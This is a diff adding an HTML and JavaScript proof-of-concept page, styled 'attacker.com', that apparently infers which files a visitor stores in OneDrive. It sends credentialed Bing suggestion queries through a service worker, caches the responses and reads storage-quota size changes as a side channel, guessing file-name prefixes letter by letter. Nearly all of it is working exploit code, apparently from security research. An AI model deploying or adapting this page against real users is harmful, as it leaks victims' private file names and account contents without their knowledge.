@@ -1,0 +1,619 @@
+<!--
+(C) Nethanel Gelernter
+
+You must not use this exploit or parts of it in any way without a permission from the author.
+
+-->
+
+<!DOCTYPE html>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <title>Which files are stored in your OneDrive account?</title>
+
+  <script>
+
+  var prevRoundPrefixes = [];
+  var allPrefixes = [];
+  var namesArray = [""];
+  var nextRoundNames = [];
+  var chosenSuffix = "";
+
+  
+  var possibleCharacters = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"];
+  
+  var suffixesArray = ["txt","zip","rar","doc","docx","xls","xlsx","ppt","pptx","odt","csv","xml","mp3","mp4","avi","jpg","bmp","jpeg","png","gif"];
+
+  var suffixesFound = [];
+  
+  var possibleCharactersCount = possibleCharacters.length;
+
+  var maxNames = 5;
+  
+  </script>
+
+  <script>
+
+var URL_PARAMETER = "url_par";
+var URL_TO_CACHE = "http://example.com?" + URL_PARAMETER + "=";
+var logString = "";
+
+var results = [];
+
+String.prototype.replaceAll = function(search, replace)
+{
+    //if replace is null, return original string otherwise it will
+    //replace search string with 'undefined'.
+    if(!replace) 
+        return this;
+
+    return this.replace(new RegExp('[' + search + ']', 'g'), replace);
+};
+
+
+function addToLogString(logStr)
+{
+	logString += logStr;
+	var ddd = document.createElement("div");
+	ddd.innerHTML = logStr.replaceAll("\n","<br>")
+	document.body.appendChild(ddd);
+}
+  
+var finalResults = [];
+
+  var randStr = randomString(5);
+  var counter = 0;
+  var CACHE_NAME = 'CACHE';
+  
+function randomString(len)
+{
+    text = "";
+    possible = "abcdefghijklmnopqrstuvwxyz";
+	numberOfCharacters = possible.length;
+	
+    for( var i=0; i < len; i++ )
+        text += possible.charAt(Math.floor(Math.random() * numberOfCharacters));
+
+    return text;
+}
+
+queryPrefix = "https://www.bing.com/as/api/v4/Suggestions?q=";
+querySuffix = "&appid=D41D8CD98F00B204E9800998ECF8427E0C818072&history=1&mkt=en-IL&textdecorations=true";
+
+function createQuery(namesString)
+{
+	if (suffixCase)
+		namesString = chosenSuffix + " " + namesString;
+		
+	return queryPrefix + namesString + querySuffix; 
+}
+
+var requestLengthLimit = 8190;
+var namePrefix = "+OR+"; // the prefix of each name, except the first name in the URL
+//var  = 500;
+
+var firstName = "FN";
+var lastName = "LN";
+
+function Capitalize(str)
+{
+	str = str.toLowerCase();
+	return str.charAt(0).toUpperCase() + str.slice(1);
+}
+
+function InitNamesSets()
+{		
+	//initSets();
+	
+	setsCounter = namesArray.length;
+	return [];
+}
+
+var initNumberOfSets = 834;
+function initSets()
+{
+	len = namesArray.length;
+	numberofsets = len;
+	for (z = 0; z < numberofsets; z++) {
+		pushSetToCheck( Math.floor(z*len/numberofsets), Math.floor((z+1)*len/numberofsets));
+	}
+}
+
+var dummyName = "131344";
+
+function replaceNameWithDummy(nameToRemove)
+{
+	namesArray[namesArray.indexOf(nameToRemove)] = dummyName;
+}
+
+function createNamesString(begin, end)
+{
+	resultArr = [namesArray[begin]];
+	for (i = begin + 1; i < end; i++)
+	{
+		resultArr.push(namePrefix, namesArray[i]);
+	}
+
+	result = resultArr.join("");
+
+	return result; 
+}
+
+function createDummyString(numberOfNames)
+{
+	return null; 
+}
+
+var firstRoundTime = 0;
+var secondRoundTime = 0;
+var firstResult = "";
+var secondResult = "";
+var currentSetIndex = -1;
+var setsCounter = 0;
+var attackStartTime = 0;
+var numberOfTests = 1;
+//var maximalCheckTimingTries = numberOfTests*4;
+var namesRequestsDuration = [];
+var dummyRequestsDuration = [];
+var queriesCounter = 0;
+var startTime = 0; // used to measure the duration
+var namesRequests = [];
+var dummyRequest = "";
+var differenceFactor = 1.05; // percent diff factor\
+var begin = 0;
+var end = 0;
+var successesCounter = 0;
+var currentTestSucceeded = false;
+
+function analyzeTiming()
+{
+	addToLogString("\n Analyzing...");
+
+	minArray = [];
+	for(dIndex = 0; dIndex < setsCounter; dIndex++)
+	{
+		minArray.push(Math.min.apply(null, namesRequestsDuration[dIndex]));
+	}
+	
+	// Continue with the sets with the minimal rank
+	nextSetsIndexes = [];
+	sortedMins = minArray.slice(0); //copy arrays
+	sortedMins.sort(function(a,b){return b-a;}); // sort from the lowest to the highest	
+	/*
+	moveNext = moveToNextStep - finalResults.length;
+	if (checkedSets.length < moveNext)
+		moveNext = checkedSets.length;
+		
+	for (nsi = 0; nsi < moveNext; nsi++)
+	{
+		nextSetIndex = minArray.indexOf(sortedMins[nsi]);
+		minArray[nextSetIndex] = -1; // if two sets have the same rank, this assignment prevents choosing the same set twice
+		begin = checkedSets[nextSetIndex][0];
+		end = checkedSets[nextSetIndex][1];
+		addToLogString("\nMight be between " + namesArray[begin] + " and " + namesArray[end-1]);
+		if (end-begin>1)
+		{
+			pushSetToCheck(begin, begin + Math.floor((end - begin)/2));
+			pushSetToCheck(begin + Math.floor((end - begin)/2), end);
+		}
+		else
+		{
+			results.push(namesArray[begin]);
+			finalResults.push(begin);
+		}
+	}
+	*/
+	
+	minVal = Math.min.apply(null, minArray);
+	maxVal = Math.max.apply(null, minArray);
+	minMaxDiff = (1.0*maxVal) / minVal;
+	ratioThreshold = 1.25;
+	
+	//addToLogString("\nMax and min vals: " + [minVal, maxVal]);
+	prefixesData = [];
+	for (si = 0; si < setsCounter; si++)
+	{
+		if (minArray[si] >= ratioThreshold*minVal)
+		{
+			addToLogString("\nThere are files with prefix: " + namesArray[si]);
+			nextRoundNames.push(namesArray[si]);
+			prefixesData.push([namesArray[si],minArray[si]]);
+		}
+	}
+	
+	nextRoundCount = nextRoundNames.length;
+	temp = [];
+	for (pi = 0; pi < prevRoundPrefixes.length; pi++)
+	{
+		longerPrefix = false;
+		for (ni = 0; ni < nextRoundCount; ni++)
+		{
+			if (nextRoundNames[ni].indexOf(prevRoundPrefixes[pi]) == 0)
+			{
+				longerPrefix = true;
+				break;
+			}
+		}
+		
+		if (!longerPrefix)
+		{
+			if (suffixesArray.indexOf(prevRoundPrefixes[pi]) == -1)
+				temp.push(prevRoundPrefixes[pi]);
+			else
+				suffixesFound.push(prevRoundPrefixes[pi]);
+		}
+	}
+	
+	finalResults = finalResults.concat(temp);
+	
+	if (nextRoundCount > maxNames)
+	{
+		nextRoundNames.splice(maxNames);
+		prefixesData.splice(maxNames);
+	}
+	
+	prevRoundPrefixes = nextRoundNames.slice(); // deep copy of array
+	
+	namesArray = nextRoundNames;
+	setsCounter = namesArray.length;
+	nextRoundNames = [];
+
+	allPrefixes = allPrefixes.concat(prefixesData);
+
+	if (namesArray.length == 0)
+	{
+		totalAttackTime = performance.now() - attackStartTime;
+		if (suffixCase)
+		{
+			addToLogString("DONE! Results (files or words in names of files with suffix <b> ." + chosenSuffix + "</b>) are:");
+		}
+		else
+		{
+			addToLogString("DONE! Results (files or words in names of files) are:");
+		}
+		
+		if (finalResults.length == 0)
+		{
+			addToLogString("no results");
+		}
+		else
+		{
+			for(i=0; i < finalResults.length; i++)
+			{
+				var maybeWrong = (suffixCase && finalResults[i].indexOf(chosenSuffix) == 0)
+				
+				addToLogString("\n" + (i+1) + ". " + finalResults[i] + (maybeWrong ? " (<b>this file might not have the desired suffix or it is a folder</b>; the searched suffix, " + chosenSuffix + ", is a prefix of this file)" : ""));
+			}
+		}
+
+		//addToLogString("\n" + finalResults);
+		//addToLogString("\nFile suffixes found:\n\n" + suffixesFound);
+		addToLogString("\nAttack was completed within <b>" + (totalAttackTime/1000) + "</b> seconds");
+		return;
+	}	
+	Algorithm();
+}
+
+function testSets()
+{
+	//addToLogString("\nTesting names between " + begin + " to " + end);
+	setsCounter = namesArray.length;
+	namesRequestsDuration = [];
+	dummyRequestsDuration = [];
+	
+	namesRequests = [];
+	for (sIndex = 0; sIndex < setsCounter; sIndex++)
+	{
+		namesRequestsDuration.push([]);
+		namesRequests.push(createQuery(namesArray[sIndex]));	
+	}
+
+	if (verificationDone)
+	{
+		beginRound();
+	}
+	else
+	{
+		addToLogString("\n\n Sending " + setsCounter + " requests for " + setsCounter + " subsets and caching their responses");
+		
+		forceCacheUrls(namesRequests).then(function() {
+			navigator.webkitTemporaryStorage.queryUsageAndQuota(function(quota, usage) {
+				firstSizeMeasurement = quota;
+				secondSizeMeasurement = firstSizeMeasurement;
+				beginRound();
+			});
+		});
+	}
+}
+
+function prepareNextRound()
+{
+	for (i = 0; i < setsCounter; i++)
+	{
+		for (j = 0; j < possibleCharactersCount; j++)
+		{
+			if (namesArray[i] == undefined) {
+				alert(1)
+				exit();
+			}
+			nextRoundNames.push(namesArray[i] + possibleCharacters[j]);
+		}
+	}
+	
+	namesArray = nextRoundNames;
+	nextRoundNames = [];
+	setsCounter = namesArray.length;
+}
+
+function beginRound()
+{
+	if (setsCounter > 0)
+	{	
+		addToLogString("\n Collecting timing measurements for " + setsCounter + " possible values");
+		testOrEndRound();
+	}
+	else
+	{
+		Algorithm();
+	}
+}
+var url;
+var counter; 
+var requestIndex = 0;
+var moveToNextStep = 4;
+var numberOfMeasurementsRounds = 1;
+var measurementsRound = 0;
+var prevSecondSizeMeasurement = -1;
+
+var prevMeasurementFailed = false;
+
+function testOrEndRound()
+{
+	if (currentSetIndex > -1)
+	{
+		tempSize = secondSizeMeasurement - firstSizeMeasurement;
+			
+		//addToLogString("Size measured: " + tempSize);
+
+		if (tempSize == 0) //|| (currentSetIndex > 0 && 1.5*Math.max.apply(null, namesRequestsDuration[currentSetIndex - 1]) < tempSize))
+		{
+			prevMeasurementFailed = true;
+			firstSizeMeasurement = secondSizeMeasurement;
+			measureSize();
+			return;
+		}
+		else if (prevMeasurementFailed)
+		{
+			prevMeasurementFailed = false;
+			firstSizeMeasurement = secondSizeMeasurement;
+			measureSize();
+			return;
+		}
+		else
+		{
+			namesRequestsDuration[currentSetIndex] = namesRequestsDuration[currentSetIndex].concat([tempSize]);
+		}
+	}
+	
+	if (currentSetIndex == setsCounter - 1)
+	{
+		currentSetIndex = -1;
+		measurementsRound++;
+				
+		if (measurementsRound == numberOfMeasurementsRounds)
+		{
+			measurementsRound = 0;
+			
+			if (secondResult == "")
+			{
+				analyzeTiming();
+			}
+			else
+			{
+				//analyzeVerificationTiming();
+				Algorithm();
+			}
+		}
+		else
+		{
+			testOrEndRound();
+		}
+	}
+	else
+	{
+		currentSetIndex++;
+		if (measurementsRound == 0) // if first measurements round
+		{
+			//addToLogString("Collecting measurements for prefix " + namesArray[currentSetIndex] + "</b>"); // + ") requests duration: " + namesRequestsDuration[dIndex]);
+		}
+		
+		url = namesRequests[currentSetIndex];
+		//url = URL_TO_CACHE + url;
+		firstSizeMeasurement = secondSizeMeasurement;
+		measureSize();
+	}
+}
+
+
+function takeSecondSizeMeasurement() {
+	navigator.webkitTemporaryStorage.queryUsageAndQuota(function(quota, usage) {
+		secondSizeMeasurement = quota;
+		testOrEndRound();
+	});
+}
+
+var firstSizeMeasurement;
+var secondSizeMeasurement;
+function measureSize() 
+{
+	caches.match(new Request(url, {mode: 'no-cors', include: 'credentials'})).then(function(resp) {
+		if (resp == null) return;
+		caches.open("CACHE").then(function(cache){
+			cache.put(new Request("" + randStr + counter++, {mode: 'no-cors', include: 'credentials'}), resp.clone()).then(function(){
+				takeSecondSizeMeasurement();
+			});
+		});
+	});
+/*
+	elm = document.createElement('script');
+	document.body.appendChild(elm);
+	elm.onerror = takeSecondSizeMeasurement;
+	elm.onload = takeSecondSizeMeasurement;
+	elm.src = url;
+*/
+}
+
+var elm;
+
+function verifyFinalResults()
+{
+	if (results.length <= 4)
+	{
+		Algorithm();
+		return;
+	}
+	
+	for (i = 0; i < finalResults.length; i++)
+	{
+		resultIndex = namesArray.indexOf(namesArray[finalResults[i]]);
+		pushSetToCheck(resultIndex, resultIndex+1);
+	}
+	
+	finalResults = [];	
+	moveToNextStep = 4;
+	
+	testSets();
+}
+
+var verificationDone = false;
+
+
+function registerWorker()
+{
+	navigator.serviceWorker.register('k2.js').then(function(registration) {
+		// Registration was successful
+		console.log('ServiceWorker registration successful with scope: ',    registration.scope);
+		if (navigator.serviceWorker.controller) {
+			console.log('The service worker is currently handling network operations.');
+			document.getElementById("startButton").hidden = false;
+		} else {
+			console.log('Please reload this page to allow the service worker to handle network operations.');
+			if (document.location.search == "")
+				document.location.replace(document.location.href + "?0");
+				
+			return;
+		}
+		
+		
+//		var messageChannel = new MessageChannel();
+//		messageChannel.port1.onmessage = function(event) {
+//		};
+//		navigator.serviceWorker.controller.postMessage({"action": "cacheFirst"}, [messageChannel.port2]);
+		
+	}).catch(function(err) {
+		// registration failed :(
+		console.log('ServiceWorker registration failed: ', err);
+	});
+}
+
+function Algorithm()
+{
+	startTime = 0;
+	// initialize variables:
+	namesRequestsDuration = [];
+	dummyRequestsDuration = [];
+	
+	if (setsCounter == 0)
+	{
+		if (!verificationDone)
+		{
+			verificationDone = true;
+			//addToLogString("\nVerifying results...");
+
+			verifyFinalResults();
+		}
+		else
+		{
+			totalAttackTime = performance.now() - attackStartTime;
+			
+			addToLogString("\n-----------------\nThe results are:");
+			if (finalResults.length == 0)
+			{
+				addToLogString("no results");
+			}
+			else
+			{
+				for(i=0; i < finalResults.length; i++)
+					addToLogString("\n" + (i+1) + ". " + namesArray[finalResults[i]]);
+			}
+			
+			addToLogString("\n\n Total Time:\n" + totalAttackTime);		
+			
+			return;
+		}		
+	}
+	else 
+	{
+		prepareNextRound();
+		testSets();
+	}
+}
+
+function forceCacheUrls(urls) {
+	//updateStatus('Start downloading resources');
+	return new Promise(function(resolve) {
+		var messageChannel = new MessageChannel();
+		messageChannel.port1.onmessage = function(event) {
+			resolve();
+		};
+		navigator.serviceWorker.controller.postMessage({"action": "cacheAll", "urls": urls}, [messageChannel.port2]);
+	});
+}
+
+var suffixCase = false;
+
+function startAttack()
+{
+	// remove spaces from the suffix 
+	var s = document.getElementById("suffixBox").value.trim();
+	// remove dots:
+	s = s.split('.').join("");
+	
+	if (s != "")
+	{
+		chosenSuffix = s;
+		suffixCase = true;
+/*
+		len = namesArray.length;
+		for (i = 0; i < len; i++)
+		{
+			namesArray[i] = s + " " + namesArray;
+		}
+*/
+	}
+	maxNames = parseInt(document.getElementById("maxNamesBox").value);
+	if (isNaN(maxNames))
+	{
+		maxNames = 5;
+	}
+	attackStartTime = performance.now();
+	InitNamesSets(namesArray);
+	Algorithm();
+}
+
+</script>
+
+</head>
+
+<body onload="registerWorker();">
+<h1>Welcome to attacker.com!</h1>
+Maximal number of concurrently tested terms: <input type="text" name="maxNamesBox" id="maxNamesBox" style="width:30px;" />
+<br><br>
+To search for files of specific type, write the suffix of this file type: <input type="text" name="suffixBox" id="suffixBox" style="width:40px;" />
+<br>
+<font color="gray">(Results will include all the files that their suffix begins with this value. For example, by typing "doc", both "doc" and "docx" files will be found)</font>
+<br><br>
+
+<input type="button" id="startButton" value="Start attack" onclick="startAttack();">
+
+
+</body></html>
